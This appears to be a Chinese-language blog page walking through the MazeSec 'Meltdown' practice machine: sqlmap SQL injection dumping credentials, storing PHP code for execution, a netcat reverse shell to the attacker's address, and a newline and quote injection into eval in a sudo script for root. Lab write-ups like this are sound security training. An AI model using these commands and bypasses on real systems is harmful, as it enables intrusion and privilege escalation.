@@ -1,0 +1,436 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>the0n3 - MazeSec Meltdown</title>
+        <meta name="description" content="靶机说明 靶机名称：Meltdown 靶机作者：Skyarrow/kaada 来源：MazeSec/QQ公开群 321948805 难度：easy 关键词：SQL 注入后台 Getshell、存储型 PHP 代码执行、sudo repeater.sh 过滤绕过、grep 按行匹配缺陷、换行符注入 摘要：本文记录了 Ma…">
+    <link rel="canonical" href="https://the0n3.top/pages/maze-meltdown/">
+    <!-- Open Graph -->
+    <meta property="og:title" content="MazeSec Meltdown">
+    <meta property="og:description" content="靶机说明 靶机名称：Meltdown 靶机作者：Skyarrow/kaada 来源：MazeSec/QQ公开群 321948805 难度：easy 关键词：SQL 注入后台 Getshell、存储型 PHP 代码执行、sudo repeater.sh 过滤绕过、grep 按行匹配缺陷、换行符注入 摘要：本文记录了 Ma…">
+    <meta property="og:url" content="https://the0n3.top/pages/maze-meltdown/">
+    <meta property="og:type" content="article">
+    <meta property="og:site_name" content="the0n3">
+    <meta property="og:locale" content="zh_CN">
+        <meta property="og:image" content="https://the0n3.top/images/maze-meltdown/1.png">
+        <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="MazeSec Meltdown">
+    <meta name="twitter:description" content="靶机说明 靶机名称：Meltdown 靶机作者：Skyarrow/kaada 来源：MazeSec/QQ公开群 321948805 难度：easy 关键词：SQL 注入后台 Getshell、存储型 PHP 代码执行、sudo repeater.sh 过滤绕过、grep 按行匹配缺陷、换行符注入 摘要：本文记录了 Ma…">
+        <meta name="twitter:image" content="https://the0n3.top/images/maze-meltdown/1.png">
+        <script>
+        (function () {
+            try {
+                var key = 'theme';
+                var saved = localStorage.getItem(key);
+                var theme = (saved === 'dark' || saved === 'light') ? saved : 'light';
+                document.documentElement.setAttribute('data-theme', theme);
+                document.documentElement.style.colorScheme = theme;
+            } catch (e) {
+                document.documentElement.setAttribute('data-theme', 'light');
+                document.documentElement.style.colorScheme = 'light';
+            }
+        })();
+    </script>
+    <!-- 使用 GitHub Markdown 样式 -->
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/site.css">
+    <!-- 功能样式（自动扫描 assets/features/ 目录） -->
+        <link rel="stylesheet" href="/assets/features/code-fold/style.css">
+        <link rel="stylesheet" href="/assets/features/image-enhance/style.css">
+        <link rel="stylesheet" href="/assets/features/reading-progress/style.css">
+        <link rel="stylesheet" href="/assets/features/tax-accordion/style.css">
+        <link rel="stylesheet" href="/assets/css/nav-reveal.css">
+    <link rel="stylesheet" href="/assets/css/search.css">
+    <!-- 代码高亮样式 -->
+    <link rel="stylesheet" href="/assets/prism/prism.css">
+</head>
+<body>
+    <div class="reading-progress" aria-hidden="true">
+        <div class="reading-progress__bar"></div>
+    </div>
+    <header>
+        <nav>
+            <div class="nav-right">
+                                <a href="/">首页</a>
+                                <a href="/archives/">归档</a>
+                                <a href="/categories/">分类</a>
+                                <a href="/tags/">标签</a>
+                                <a href="/friends/">友链</a>
+                                <a href="/about/">关于</a>
+                                <a href="https://www.travellings.cn/go.html">开往</a>
+                                                <button
+                    id="searchTrigger"
+                    class="search-trigger"
+                    type="button"
+                    aria-label="打开搜索"
+                    aria-haspopup="dialog"
+                    aria-controls="searchModal"
+                    title="搜索（/）"
+                >
+                    <span class="search-trigger__label">搜索</span>
+                    <span class="search-trigger__hint">/</span>
+                </button>
+            </div>
+        </nav>
+    </header>
+                <div class="page-layout">
+            <main class="markdown-body">
+                
+<article class="post-content">
+    <h1>MazeSec Meltdown</h1>
+    <p>
+        <span class="meta">发布于: 2026-01-04 17:40</span>
+    </p>
+    <div class="post-body">
+        <h2>靶机说明</h2>
+<p>靶机名称：Meltdown<br>
+靶机作者：Skyarrow/kaada<br>
+来源：MazeSec/QQ公开群 321948805<br>
+难度：easy  </p>
+<p><strong>关键词</strong>：SQL 注入后台 Getshell、存储型 PHP 代码执行、sudo repeater.sh 过滤绕过、grep 按行匹配缺陷、换行符注入</p>
+<p><strong>摘要</strong>：本文记录了 MazeSec Meltdown 靶机的渗透过程。选手通过 SQL 注入漏洞获取后台用户 rin 的明文凭证，登录后台后在物品描述字段写入 PHP 代码，利用后端直接解析存储内容的特性触发代码执行，获取 www-data 权限；在 rin 用户环境下发现其拥有 sudo 权限执行 /opt/repeater.sh 脚本，审计脚本发现过滤逻辑存在多处缺陷：grep 按行匹配的特性使得仅单行无空格的输入可绕过格式校验，eval 语句未严格处理用户输入导致引号注入，结合换行符注入可绕过空格限制，最终实现以 root 权限执行任意命令，完成权限提升。该靶机重点考察了 SQL 注入的信息利用、存储型代码执行的风险以及 sudo 自定义脚本中常见的过滤逻辑缺陷挖掘与绕过技巧。</p>
+<h2>1、主机发现</h2>
+<p>使用 arp-scan 进行扫描局域网存活主机：</p>
+<pre><code class="language-bash">┌──(npc㉿kali)-[~]
+└─$ sudo arp-scan -I eth2 192.168.6.0/24
+
+192.168.6.119   08:00:27:6d:a4:01       (Unknown)</code></pre>
+<p>目标主机：192.168.6.119</p>
+<h2>2、端口扫描</h2>
+<p>使用 nmap 进行 TCP 全端口扫描：</p>
+<pre><code class="language-bash">┌──(npc㉿kali)-[~]
+└─$ nmap 192.168.6.119 -sT -sV -p-
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
+53/tcp open  domain  (generic dns response: NOTIMP)
+80/tcp open  http    Apache httpd 2.4.62 ((Debian))</code></pre>
+<p>发现 3 个开放端口：22（SSH）、53（DNS）、80（HTTP）</p>
+<h2>3、80 端口 Web 服务探测</h2>
+<p>访问 80 端口</p>
+<p><img src="/images/maze-meltdown/1.png" alt="" decoding="async" width="1920" height="879"></p>
+<p>点击物品列表，进入新页面，可以看到物品描述中包含 <code>echo</code> 语句，并且其输出会直接在页面上展示，说明后台很可能是<strong>直接执行了数据库中存储的描述字段内容</strong>，这里存在潜在的代码执行风险。</p>
+<p><img src="/images/maze-meltdown/2.png" alt="" decoding="async" loading="lazy" width="1058" height="513"></p>
+<p>给页面的 id 参数添加一个单引号，出现 SQL 报错，放在 sqlmap 跑</p>
+<p><img src="/images/maze-meltdown/3.png" alt="" decoding="async" loading="lazy" width="1427" height="664"></p>
+<pre><code class="language-bash">┌──(npc㉿kali)-[~]
+└─$ sqlmap -u "http://192.168.6.119/item.php?id=1" -p id --batch --dbs  
+[15:27:55] [INFO] fetching database names
+available databases [5]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] sys
+[*] target
+
+┌──(npc㉿kali)-[~]
+└─$ sqlmap -u "http://192.168.6.119/item.php?id=1" -p id --batch --dbs -D target  --tables
+[15:28:18] [INFO] fetching tables for database: 'target'
+Database: target
+[3 tables]
++------------+
+| characters |
+| items      |
+| users      |
++------------+
+┌──(npc㉿kali)-[~]
+└─$ sqlmap -u "http://192.168.6.119/item.php?id=1" -p id --batch --dbs -D target  --tables --dump
+[15:28:24] [INFO] fetching entries for table 'characters' in database 'target'
+Database: target
+Table: characters
+[6 entries]
++----+----------+----------------------------------------------------------------------------------------------------------------+
+| id | name     | description                                                                                                    |
++----+----------+----------------------------------------------------------------------------------------------------------------+
+| 1  | 初音ミク | 初音未来是Crypton Future Media以Yamaha的VOCALOID系列语音合成程序为基础开发的音源库，是术曲文化的重要代表人物。 |
+| 2  | 鏡音リン | 镜音铃是CRYPTON FUTURE MEDIA以Yamaha的VOCALOID 2语音合成引擎为基础开发的虚拟歌手，是术曲《炉心融解》的原唱。   |
+| 3  | 鏡音レン | 镜音连是镜音铃的搭档，同样是VOCALOID虚拟歌手，在众多术曲中与镜音铃合作演唱。                                   |
+| 4  | 巡音ルカ | 巡音流歌是CRYPTON FUTURE MEDIA以Yamaha的VOCALOID 2语音合成引擎为基础开发的虚拟女性歌手软件角色，音色成熟华丽。 |
+| 5  | KAITO    | KAITO是CRYPTON FUTURE MEDIA发售的VOCALOID系列语音合成软件的虚拟歌手，是VOCALOID家族中的大哥角色。              |
+| 6  | MEIKO    | MEIKO是CRYPTON FUTURE MEDIA发售的VOCALOID系列语音合成软件的虚拟歌手，是VOCALOID家族中的大姐角色。              |
++----+----------+----------------------------------------------------------------------------------------------------------------+
+[15:28:24] [INFO] fetching entries for table 'users' in database 'target'
+Database: target
+Table: users
+[1 entry]
++----+----------+----------+
+| id | password | username |
++----+----------+----------+
+| 1  | rin123   | rin      |
++----+----------+----------+
+[15:28:24] [INFO] fetching entries for table 'items' in database 'target'
+Database: target
+Table: items
+[1 entry]
++----+--------+--------------------------------------+
+| id | name   | description                          |
++----+--------+--------------------------------------+
+| 1  | 炉心   | echo "这是一个关于炉心融解的物品。"; |
++----+--------+--------------------------------------+</code></pre>
+<p>可以找到在 users 表中有一个用户 rin，密码 rin123，另外在 items 表中有一个物品，描述中存在 echo 语句。</p>
+<h2>4、后台写入 WebShell</h2>
+<p>使用用户 rin 和密码 rin123 前台登录</p>
+<p><img src="/images/maze-meltdown/4.png" alt="" decoding="async" loading="lazy" width="1920" height="879"></p>
+<p>进入物品管理，物品介绍内容里写入 php 代码</p>
+<p><img src="/images/maze-meltdown/5.png" alt="" decoding="async" loading="lazy" width="1920" height="879"></p>
+<p>返回查看物品，可以发现代码执行</p>
+<p><img src="/images/maze-meltdown/6.png" alt="" decoding="async" loading="lazy" width="1920" height="879"></p>
+<p>写个 WebShell ，反弹个 Shell 回来</p>
+<pre><code class="language-php">system('busybox nc 192.168.6.101 4444 -e bash');</code></pre>
+<p>可以在 家目录写入两个可执行文件，方便后续稳定 Shell</p>
+<pre><code class="language-bash">mkdir -p $HOME/.local/bin
+cat &lt;&lt; EOF &gt; $HOME/.local/bin/xxx
+#!/bin/bash
+echo '
+
+/usr/bin/script  -qc /bin/bash /dev/null
+
+'
+EOF
+chmod +x $HOME/.local/bin/xxx
+cat &lt;&lt; EOF &gt; $HOME/.local/bin/yyy
+#!/bin/bash
+echo '
+
+
+stty raw -echo; fg  
+
+
+reset xterm  
+export TERM=xterm  
+echo \$SHELL  
+export SHELL=/bin/bash  
+
+'
+rows=\$(stty size | awk '{print \$1}')
+cols=\$(stty size | awk '{print \$2}')
+
+echo "stty rows \$rows cols \$cols"
+EOF
+chmod +x $HOME/.local/bin/yyy</code></pre>
+<p>这有什么用？优化体验。</p>
+<p>这个路径默认在一些发行版的 PATH 里，现在作为可执行文件，可以让你在任何目录执行 xxx 和 yyy 来获得一个稳定的交互式 Shell 的 payload</p>
+<p><img src="/images/maze-meltdown/8.png" alt="" decoding="async" loading="lazy" width="722" height="664"></p>
+<p>拿到一个 nc 反弹 Shell 后，在另一个终端执行 xxx ，拿到 <code>/usr/bin/script  -qc /bin/bash /dev/null</code>，复制到反弹 Shell 的终端执行</p>
+<p>然后 ctrl + z ，再执行 yyy ，拿到另一个 payload 稳定 Shell，避免因为上下方向键乱码、 ctrl + c 导致断开、无法使用 clear、命令交互、无法命令补全 等问题</p>
+<p>演示</p>
+<video width="600" controls>
+  <source src="/images/maze-meltdown/demo.mp4" type="video/mp4">
+  演示
+</source></video>
+<h2>5、rin 用户凭证泄露</h2>
+<p>在 opt 目录可以找到 rin 用户的 SSH 密码</p>
+<pre><code class="language-bash">www-data@meltdown:/opt$ cat passwd.txt 
+rin:b59a85af917afd07</code></pre>
+<h2>6、sudo 脚本绕过 grep 过滤</h2>
+<p>查看 rin 用户存在 sudo 权限执行脚本</p>
+<pre><code class="language-bash">rin@meltdown:~$ cat /opt/repeater.sh 
+#!/bin/bash
+
+# 严格过滤但留有注入点的示例脚本
+# 预期功能：安全地显示用户输入
+# 隐藏漏洞：可通过特定方式绕过过滤执行命令
+
+main() {
+    local user_input="$1"
+
+    # 基础过滤：黑名单方式过滤危险字符
+    if echo "$user_input" | grep -qE '[;&amp;|`$\\]'; then
+        echo "错误：输入包含非法字符"
+        return 1
+    fi
+
+    # 关键字过滤
+    if echo "$user_input" | grep -qiE '(cat|ls|echo|rm|mv|cp|chmod)'; then
+        echo "错误：输入包含危险关键字"
+        return 1
+    fi
+
+    # 空格限制（但允许特定形式的空格）
+    if echo "$user_input" | grep -qE '[[:space:]]'; then
+        if ! echo "$user_input" | grep -qE '^[a-zA-Z0-9]*[[:space:]]+[a-zA-Z0-9]*$'; then
+            echo "错误：空格使用受限"
+            return 1
+        fi
+    fi
+
+    # 看似安全的输出处理
+    echo "处理结果: $user_input"
+
+    # 隐藏的注入点：特定环境变量未被过滤
+    local sanitized_input=$(echo "$user_input" | tr -d '\n\r')
+    eval "output=\"$sanitized_input\""
+    echo "最终输出: $output"
+}
+
+# 脚本入口
+if [ $# -ne 1 ]; then
+    echo "用法: $0 &lt;输入内容&gt;"
+    exit 1
+fi
+
+main "$1"</code></pre>
+<p>脚本带有注释，很好分析</p>
+<h3>1、过滤黑名单字符</h3>
+<p>过滤了 ; &amp; | ` $ \ 等字符，避免命令拼接、执行多条命令或命令替换玩法</p>
+<pre><code class="language-bash"># 基础过滤：黑名单方式过滤危险字符
+if echo "$user_input" | grep -qE '[;&amp;|`$\\]'; then
+    echo "错误：输入包含非法字符"
+    return 1
+fi</code></pre>
+<h3>2、过滤关键字</h3>
+<p>这里只是过滤了一些简单命令，如果能够找到命令注入点，这些关键词过滤形同虚设</p>
+<pre><code class="language-bash"># 关键字过滤
+if echo "$user_input" | grep -qiE '(cat|ls|echo|rm|mv|cp|chmod)'; then
+    echo "错误：输入包含危险关键字"
+    return 1
+fi</code></pre>
+<h3>3、空格限制</h3>
+<p>过滤了空格，但是允许特定形式的空格</p>
+<pre><code class="language-bash"># 空格限制（但允许特定形式的空格）
+if echo "$user_input" | grep -qE '[[:space:]]'; then
+    if ! echo "$user_input" | grep -qE '^[a-zA-Z0-9]*[[:space:]]+[a-zA-Z0-9]*$'; then
+        echo "错误：空格使用受限"
+        return 1
+    fi
+fi</code></pre>
+<p>这里会检查参数是否存在空格，如果存在空格，需要符合 grep 的正则表达式 <code>^[a-zA-Z0-9]*[[:space:]]+[a-zA-Z0-9]*$</code>，符合的格式：</p>
+<pre><code class="language-bash">id
+ id 
+id123 i123d</code></pre>
+<p>需要注意的是，grep 按行匹配，可以利用 grep 视野盲区，只要某一行没有空格，就不会进入第三层检查，检查是否符合以上三种格式，可以使用 <code>bash -x</code>执行脚本，方便调试</p>
+<h3>4、eval 注入点</h3>
+<p>脚本里存在一个 eval 执行代码，会先尝试替换掉换行符和回车符</p>
+<pre><code class="language-bash"># 隐藏的注入点：特定环境变量未被过滤
+local sanitized_input=$(echo "$user_input" | tr -d '\n\r')
+eval "output=\"$sanitized_input\""</code></pre>
+<h3>5、本地调试</h3>
+<p>尝试使用 <code>bash -x</code> 执行脚本，方便调试，因为<code>eval "output=\"$sanitized_input\""</code> 这里使用双引号包裹变量，可以尝试给一个双引号，看看会发生什么</p>
+<p>脚本因为我们传入的双引号，导致闭合出现问题，那么说明我们可以通过闭合双引号，真实的改变 eval 执行语句的结构</p>
+<p><img src="/images/maze-meltdown/9.png" alt="" decoding="async" loading="lazy" width="1036" height="622"></p>
+<p>在 <code>3、空格限制</code> 和 <code>4、替换掉换行符和回车符</code>，两个限制条件放在一起，可以想到，通过 <code>3、空格限制</code>，使用 <code>id</code>的格式，构造出空格，使用 <code>4、替换掉换行符和回车符</code>，在把换行和回车符替换掉后，会出现拼接的效果，通过这个特性，可以构造出任意命令执行</p>
+<p>参数里怎么输入换行？你只需要不闭合引号，直接输入换行，最后闭合引号即可，中间内容都会原样传给脚本</p>
+<p>例如：</p>
+<p><img src="/images/maze-meltdown/10.png" alt="" decoding="async" loading="lazy" width="761" height="228"></p>
+<p><img src="/images/maze-meltdown/11.png" alt="" decoding="async" loading="lazy" width="800" height="514"></p>
+<p>换成 sudo 执行即可</p>
+<p><img src="/images/maze-meltdown/12.png" alt="" decoding="async" loading="lazy" width="684" height="298"></p>
+<p><img src="/images/maze-meltdown/13.png" alt="" decoding="async" loading="lazy" width="705" height="287"></p>
+<p>甚至实现空格自由，执行个反弹 Shell 命令</p>
+<p><img src="/images/maze-meltdown/14.png" alt="" decoding="async" loading="lazy" width="858" height="848"></p>
+<p><img src="/images/maze-meltdown/15.png" alt="" decoding="async" loading="lazy" width="879" height="266"></p>
+<p>最后总结，这里脚本过滤绕过的核心利用点在于：</p>
+<ul>
+<li>引号注入原始结构</li>
+<li>grep 按行匹配</li>
+<li>关键词过滤形同虚设</li>
+<li>换行回车的处理比较宽松，成为关键利用点</li>
+</ul>    </div>
+        <div class="post-meta-footer">
+                    <span class="post-meta-item">分类:
+                                    <span>MazeSec</span>
+                            </span>
+                            <span class="post-meta-item">标签:
+                                    <span>#换行符注入</span>
+                            </span>
+            </div>
+    </article>
+
+
+<section class="post-comments" aria-label="Comments">
+    <script src="https://giscus.app/client.js"
+        data-repo="Apursuit/the0n3-blog"
+        data-repo-id="R_kgDORvPPbA"
+        data-category="Announcements"
+        data-category-id="DIC_kwDORvPPbM4C5KAt"
+        data-mapping="pathname"
+        data-strict="0"
+        data-reactions-enabled="1"
+        data-emit-metadata="0"
+        data-input-position="bottom"
+        data-theme="light"
+        data-lang="zh-CN"
+        crossorigin="anonymous"
+        async>
+    </script>
+</section>
+
+            </main>
+                <aside class="post-toc" aria-label="Table of contents">
+        <div class="toc-title">目录</div>
+        <nav class="toc-list"></nav>
+    </aside>
+            </div>
+    
+    <!-- 搜索命令面板：
+         第一版先提供标题、日期、标签搜索，以及键盘导航和快捷键 -->
+    <div id="searchModal" class="search-modal" hidden>
+        <div class="search-modal__overlay" data-search-close></div>
+        <div class="search-modal__dialog" role="dialog" aria-modal="true" aria-labelledby="searchModalTitle">
+            <div class="search-modal__panel">
+                <div class="search-modal__header">
+                    <div class="search-modal__title-group">
+                        <div id="searchModalTitle" class="search-modal__title">搜索文章</div>
+                        <div class="search-modal__subtitle">输入标题、标签或关键词，按 Enter 打开结果</div>
+                    </div>
+                    <button
+                        id="searchClose"
+                        class="search-modal__close"
+                        type="button"
+                        aria-label="关闭搜索"
+                        title="关闭搜索"
+                    >
+                        ×
+                    </button>
+                </div>
+
+                <div class="search-modal__body">
+                    <label class="search-input-wrap" for="searchInput">
+                        <span class="search-input-wrap__icon" aria-hidden="true">⌕</span>
+                        <input
+                            id="searchInput"
+                            class="search-input"
+                            type="text"
+                            placeholder="搜索文章..."
+                            autocomplete="off"
+                            spellcheck="false"
+                        >
+                    </label>
+
+                    <div class="search-help">
+                        <span>/ 打开</span>
+                        <span>↑ ↓ 选择</span>
+                        <span>Enter 打开</span>
+                        <span>Esc 关闭</span>
+                    </div>
+
+                    <div id="searchState" class="search-state" aria-live="polite">输入关键词开始搜索</div>
+                    <div id="searchResults" class="search-results" role="listbox" aria-label="搜索结果"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <button id="backToTop" class="fab fab-top" type="button" aria-label="返回顶部" title="返回顶部">↑</button>
+    <button id="themeToggle" class="theme-toggle" type="button" aria-label="切换主题" title="切换主题"></button>
+    <script src="/assets/js/site.js"></script>
+    <!-- 功能脚本（自动扫描 assets/features/ 目录） -->
+        <script src="/assets/features/code-fold/script.js"></script>
+        <script src="/assets/features/image-enhance/script.js"></script>
+        <script src="/assets/features/reading-progress/script.js"></script>
+        <script src="/assets/features/tax-accordion/script.js"></script>
+        <script src="/assets/js/navReveal.js"></script>
+    <!-- 启动代码高亮及行号显示 -->
+    <script src="/assets/prism/prism.js"></script>
+    <script src="/assets/prism/prism-line-number.js"></script>
+    <!-- 主题切换 -->
+    <script src="/assets/js/ThemeSwitch.js"></script>
+    <!-- 弹簧动画工具（搜索弹窗/灯箱进出场依赖） -->
+    <script src="/assets/js/spring.js"></script>
+    <!-- 搜索功能 -->
+    <script src="/assets/js/fuse.js"></script>
+    <script src="/assets/js/search.js"></script>
+</body>
+</html>
